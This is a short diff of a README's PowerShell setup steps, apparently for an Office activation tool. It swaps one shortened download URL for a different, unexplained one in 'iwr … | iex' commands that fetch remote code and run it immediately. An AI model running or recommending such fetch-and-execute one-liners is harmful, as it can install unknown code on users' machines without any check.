@@ -146,11 +146,11 @@ To run via powershell command line:
 
 2.   **Copy and paste the code below, then press Enter.**  
 ```
-iwr cutt.ly/tsf-ohook | iex
+iwr tinyurl.com/getpmas | iex
 ```
 **On Windows versions without the Internet Explorer engine.**  
 ```
-iwr cutt.ly/tsf-ohook -UseBasicParsing | iex
+iwr tinyurl.com/getpmas -UseBasicParsing | iex
 ```
 ---
 
